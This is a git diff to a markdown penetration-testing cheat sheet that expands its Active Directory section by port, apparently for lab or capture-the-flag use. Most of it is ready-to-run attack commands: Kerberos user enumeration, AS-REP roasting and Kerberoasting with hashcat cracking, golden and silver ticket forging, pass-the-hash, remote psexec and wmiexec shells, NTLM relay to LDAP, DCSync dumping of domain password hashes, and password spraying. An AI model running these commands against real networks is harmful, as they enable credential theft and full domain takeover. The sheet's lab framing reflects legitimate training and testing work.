@@ -671,13 +671,11 @@ ssh -R 4444:127.0.0.1:4444 <user>@<target-ip>
 ## Active Directory
 
 ### Attack Flow
-
 ```
 Initial Access -> Enumeration -> Identify Weakness -> Exploit -> Privilege Escalation -> Own Domain
 ```
 
 ### What to Look For
-
 | Target | Goal |
 |--------|------|
 | Users | Who exists in the domain |
@@ -690,7 +688,6 @@ Initial Access -> Enumeration -> Identify Weakness -> Exploit -> Privilege Escal
 ---
 
 ### Initial Nmap Scan -- AD Ports
-
 ```bash
 nmap -sV -A -p- -oX nmapresults.xml <target>
 searchsploit --nmap nmapresults.xml
@@ -698,60 +695,104 @@ searchsploit --nmap nmapresults.xml
 
 | Port | Service | Notes |
 |------|---------|-------|
+| 53 | DNS | AD-integrated DNS, often zone-transferable if misconfigured |
 | 88 | Kerberos | Authentication in AD |
-| 135 | RPC | Remote Procedure Call |
+| 135 | RPC | Remote Procedure Call (endpoint mapper) |
 | 139 | NetBIOS | Legacy SMB support |
 | 389 | LDAP | Directory queries |
 | 445 | SMB | File sharing + enumeration |
+| 464 | kpasswd | Kerberos password change |
+| 593 | RPC over HTTP | Alt RPC transport |
 | 636 | LDAPS | LDAP over SSL |
 | 3268 | Global Catalog | Domain-wide user search |
+| 3269 | Global Catalog SSL | GC over SSL |
+| 5985/5986 | WinRM | Remote management (HTTP/HTTPS) |
+| 9389 | AD Web Services | .NET-based, used by PowerShell AD module |
+
+> **Version note:** `-A` runs OS/version detection, script scanning, and traceroute together — on a full `-p-` scan this can take a long time. On a big AD range, consider running `-sV -sC` first for speed and saving `-A`'s OS-detection/traceroute overhead for a single target.
 
 ---
 
-### SMB Enumeration
+## Port 53 — DNS
 
+### Recon/Enumeration
 ```bash
-# All-in-one enumeration
-enum4linux -a <target>
+# Basic lookup of the domain
+dig @<target> <domain>
 
-# CrackMapExec -- enumerate users
-crackmapexec smb <target> --users
+# Attempt a zone transfer (often blocked, but worth checking)
+dig axfr @<target> <domain>
 
-# CrackMapExec -- enumerate shares
-crackmapexec smb <target> --shares
+# Enumerate common AD-related DNS records
+dig @<target> _ldap._tcp.dc._msdcs.<domain> SRV
+dig @<target> _kerberos._tcp.dc._msdcs.<domain> SRV
+```
+These SRV records reveal the actual Domain Controller hostname(s), which is useful before targeting Kerberos/LDAP directly.
 
-# List SMB shares (null session)
-smbclient -L //<target> -N
+---
 
-# Connect to a share (null session)
-smbclient //<target>/<sharename> -N
+## Port 88 — Kerberos
 
-# Map shares with permissions
-smbmap -H <target>
+### Recon/Enumeration
+```bash
+# Confirm the port is live and identify the realm via a Kerberos error response
+kerbrute -h  # verify installed version/flags before use — flag set varies by build
 
-# Map shares with credentials
-smbmap -H <target> -u <username> -p <password>
+# User enumeration via Kerberos pre-auth (does not require valid creds)
+kerbrute userenum -d <domain> --dc <target> userlist.txt
+```
+Kerberos user enumeration works because the KDC responds differently for valid vs. invalid usernames during pre-authentication — this is a distinct technique from AS-REP roasting below, and doesn't require pre-auth to be disabled.
+
+### AS-REP Roasting (expanded)
+Only works against accounts with **"Do not require Kerberos preauthentication"** set.
+```bash
+# Find accounts with pre-auth disabled and grab their hashes (no creds needed)
+impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <target> -no-pass -format hashcat
+
+# If you already have one valid credential, you can enumerate via LDAP instead of a wordlist
+impacket-GetNPUsers <domain>/<username>:<password> -dc-ip <target> -request
+
+# Crack the AS-REP hash
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
 ```
 
----
-
-### LDAP Enumeration
-
+### Kerberoasting (expanded)
+Targets service accounts with an SPN set — their TGS is encrypted with the service account's password hash.
 ```bash
-# All-in-one LDAP enumeration
-enum4linux-ng -A <target>
+# Request service tickets for all SPNs, then crack offline
+impacket-GetUserSPNs <domain>/<username>:<password> -dc-ip <target> -request
 
-# LDAP anonymous query
-ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(objectClass=person)"
+# Save output in hashcat format explicitly
+impacket-GetUserSPNs <domain>/<username>:<password> -dc-ip <target> -request -outputfile spn_hashes.txt
 
-# Query for all users
-ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(objectClass=user)" sAMAccountName
+# Crack the TGS ticket with hashcat (RC4 tickets)
+hashcat -m 13100 ticket.txt /usr/share/wordlists/rockyou.txt
+
+# AES-encrypted tickets use a different mode — check the hash prefix ($krb5tgs$18$ = AES256)
+hashcat -m 19700 ticket.txt /usr/share/wordlists/rockyou.txt
 ```
+> **Flag this:** hashcat mode numbers for Kerberos hashes have changed across versions as AES support was added — confirm with `hashcat --help | grep -i krb5` on the version you're running rather than assuming 13100/18200 are current.
+
+### Ticket Attacks (post-compromise)
+These require an existing foothold with sufficient rights (domain admin for golden ticket; access to a specific service account's hash for silver ticket) — not initial-access techniques.
+```bash
+# Golden Ticket — forge a TGT using the krbtgt hash (requires krbtgt NTLM hash, obtained via DCSync or similar)
+impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain <domain> <username>
+
+# Silver Ticket — forge a TGS for a specific service using that service account's hash
+impacket-ticketer -nthash <service_account_hash> -domain-sid <SID> -domain <domain> -spn <service_spn> <username>
+
+# Use a forged ticket (set KRB5CCNAME then use impacket tools with -k -no-pass)
+export KRB5CCNAME=ticket.ccache
+impacket-psexec -k -no-pass <domain>/<username>@<target>
+```
+I'm confident on the general workflow above; exact required privileges and any additional flags (e.g., `-user-id`, `-aesKey` vs `-nthash`) should be checked against `impacket-ticketer -h` for the impacket version installed, since these tools change between releases.
 
 ---
 
-### RPC Enumeration
+## Port 135 — RPC (Endpoint Mapper)
 
+### Recon/Enumeration
 ```bash
 # Check for null session access
 rpcclient -U "" <target> -N
@@ -762,14 +803,20 @@ rpcclient $> enumdomusers
 # Enumerate domain groups
 rpcclient $> enumdomgroups
 
-# Get user info
+# Get user info (RID from enumdomusers output)
 rpcclient $> queryuser <RID>
+
+# Enumerate group membership
+rpcclient $> querygroupmem <group_RID>
+
+# Password policy (useful before any brute-forcing)
+rpcclient $> getdompwinfo
+
+# List domain trust relationships
+rpcclient $> enumdomains
 ```
 
----
-
 ### RID Cycling
-
 ```bash
 # Common RID values
 # 500  = Administrator
@@ -783,54 +830,159 @@ crackmapexec smb <target> -u '' -p '' --rid-brute
 
 # RID cycling with enum4linux
 enum4linux -r -u "" -p "" <target>
+
+# Manual RID cycling via rpcclient (loop, adjust range as needed)
+for i in $(seq 500 1100); do
+  rpcclient -U "" -N <target> -c "queryuser 0x$(printf '%x' $i)" 2>/dev/null | grep "User Name"
+done
 ```
+
+### Notable RPC-based exploits
+```bash
+# MS08-067 (legacy, rarely seen outside deliberately vulnerable labs)
+# — verify target OS/patch level before attempting; this is a well-known CVE, not something to guess flags for
+searchsploit ms08-067
+```
+For CVE-specific exploit modules (Metasploit or otherwise), confirm the module name and required options with `search`/`info`/`show options` inside msfconsole rather than reciting option names from memory — they change across versions.
 
 ---
 
-### BloodHound + SharpHound
+## Port 139/445 — SMB
 
+### SMB Enumeration
 ```bash
-# Step 1 -- Run SharpHound on the target (Windows) to collect data
-.\SharpHound.exe -c All --outputdirectory C:\temp\
+# All-in-one enumeration
+enum4linux -a <target>
 
-# Step 2 -- Transfer the resulting .zip back to your machine
-# (use smbserver, python http server, or nc)
+# CrackMapExec -- enumerate users
+crackmapexec smb <target> --users
 
-# Step 3 -- Start neo4j and BloodHound on your attack machine
-sudo neo4j start
-bloodhound &
+# CrackMapExec -- enumerate shares
+crackmapexec smb <target> --shares
 
-# Step 4 -- Upload the .zip to BloodHound UI
-# Drag and drop the SharpHound zip into the BloodHound interface
+# CrackMapExec -- check password policy
+crackmapexec smb <target> --pass-pol
 
-# Step 5 -- Run pre-built queries
-# "Find Shortest Paths to Domain Admins"
-# "Find all Domain Admins"
-# "Principals with DCSync Rights"
+# CrackMapExec -- validate a credential (also confirms local admin if it returns Pwn3d!)
+crackmapexec smb <target> -u <username> -p <password>
+
+# List SMB shares (null session)
+smbclient -L //<target> -N
+
+# Connect to a share (null session)
+smbclient //<target>/<sharename> -N
+
+# Map shares with permissions
+smbmap -H <target>
+
+# Map shares with credentials
+smbmap -H <target> -u <username> -p <password>
+
+# Recursively search shares for interesting files
+smbmap -H <target> -u <username> -p <password> -R <sharename>
 ```
+
+> **Note on `crackmapexec`:** it's been effectively superseded by **NetExec (nxc)** in many current distros/repos — same syntax pattern in most cases (`nxc smb <target> --users`), but confirm which one is actually installed with `which crackmapexec nxc` before assuming flag compatibility.
+
+### Exploitation
+```bash
+# Pass-the-Hash (use an NTLM hash instead of a plaintext password)
+crackmapexec smb <target> -u <username> -H <nthash>
+impacket-psexec -hashes :<nthash> <domain>/<username>@<target>
+
+# PsExec-style shell with valid creds
+impacket-psexec <domain>/<username>:<password>@<target>
+
+# WMI-based execution (quieter than psexec, no service binary dropped)
+impacket-wmiexec <domain>/<username>:<password>@<target>
+
+# EternalBlue (MS17-010) — deliberately-vulnerable lab boxes only
+crackmapexec smb <target> -u '' -p '' -M ms17-010   # check-only, doesn't exploit
+```
+Don't assume EternalBlue will work without confirming the target is actually unpatched (`-M ms17-010` check first) — this is exactly the kind of "plausible-sounding" assumption the ground rules flag against.
 
 ---
 
-### Kerberoasting
+## Port 389/636/3268/3269 — LDAP / LDAPS / Global Catalog
 
+### LDAP Enumeration
 ```bash
-# Request service tickets for all SPNs, then crack offline
-impacket-GetUserSPNs <domain>/<username>:<password> -dc-ip <target> -request
+# All-in-one LDAP enumeration
+enum4linux-ng -A <target>
 
-# Crack the TGS ticket with hashcat
-hashcat -m 13100 ticket.txt /usr/share/wordlists/rockyou.txt
+# LDAP anonymous query
+ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(objectClass=person)"
+
+# Query for all users
+ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(objectClass=user)" sAMAccountName
+
+# Query for all groups
+ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(objectClass=group)" cn
+
+# Query for computers joined to the domain
+ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(objectClass=computer)" dNSHostName
+
+# Query for accounts with pre-auth disabled (AS-REP roastable) directly via LDAP
+ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
+
+# Authenticated bind (once you have creds)
+ldapsearch -x -H ldap://<target> -D "<domain>\<username>" -w <password> -b "DC=<domain>,DC=<tld>" "(objectClass=user)"
 ```
+
+### Global Catalog (3268/3269)
+Same LDAP query syntax works against 3268, but searches span the **entire forest** rather than a single domain — useful in multi-domain environments to find users/groups without knowing which domain they live in.
+```bash
+ldapsearch -x -H ldap://<target>:3268 -b "DC=<domain>,DC=<tld>" "(objectClass=user)" sAMAccountName
+```
+
+### BloodHound collection via LDAP (no agent on target)
+```bash
+# bloodhound-python — collects from LDAP + SMB remotely, no SharpHound.exe needed
+bloodhound-python -u <username> -p <password> -d <domain> -ns <dc_ip> -c All
+```
+
+### LDAP Relay / NTLM Relay to LDAP
+Requires a machine account or user to authenticate to you (e.g., via a coerced auth or responder capture) with LDAP signing not enforced.
+```bash
+# ntlmrelayx targeting LDAP — check current impacket flags, this changes often
+impacket-ntlmrelayx -t ldap://<target> --escalate-user <controlled_user>
+```
+I'd verify `--escalate-user` and related relay-to-LDAP flags against `impacket-ntlmrelayx -h` for your installed version before running this — relay tooling option names shift release to release.
 
 ---
 
-### AS-REP Roasting
+## Post-Compromise / Lateral Movement (cross-port)
 
+### Pass-the-Hash / Overpass-the-Hash
 ```bash
-# Find accounts with pre-auth disabled and grab their hashes
-impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <target> -no-pass
+# Pass-the-hash across most SMB/WMI/RPC tools
+impacket-psexec -hashes :<nthash> <domain>/<username>@<target>
 
-# Crack the AS-REP hash
-hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+# Overpass-the-hash — use NTLM hash to request a real Kerberos TGT
+impacket-getTGT <domain>/<username> -hashes :<nthash>
+export KRB5CCNAME=<username>.ccache
+```
+
+### DCSync
+Requires the target account to have replication rights (Domain Admins, or specifically delegated `Replicating Directory Changes` rights).
+```bash
+impacket-secretsdump <domain>/<username>:<password>@<target>
+```
+This dumps NTDS.dit contents remotely without touching disk on the DC — including the `krbtgt` hash needed for golden tickets above.
+
+### Unconstrained/Constrained Delegation abuse, Zerologon, PrintNightmare, etc.
+These are specific CVE/misconfiguration exploit paths, each with version-sensitive tooling and preconditions (e.g., Zerologon/CVE-2020-1472 only affects unpatched DCs). Rather than list exploit commands from memory here, treat each as its own lookup: confirm the CVE applies to the target's patch level first (`searchsploit`, vendor advisory, or `crackmapexec`/`nxc` check-modules where available), then pull exact tool syntax from `-h`/`--help` on the specific tool version in your lab environment.
+
+---
+
+## Password Policy / Spray Considerations
+```bash
+# Check policy before any spraying to avoid lockouts
+crackmapexec smb <target> --pass-pol
+rpcclient -U "" -N <target> -c "getdompwinfo"
+
+# Password spray (single password, many users) — respects lockout threshold better than brute force
+crackmapexec smb <target> -u users.txt -p '<single_password>'
 ```
 
 ---
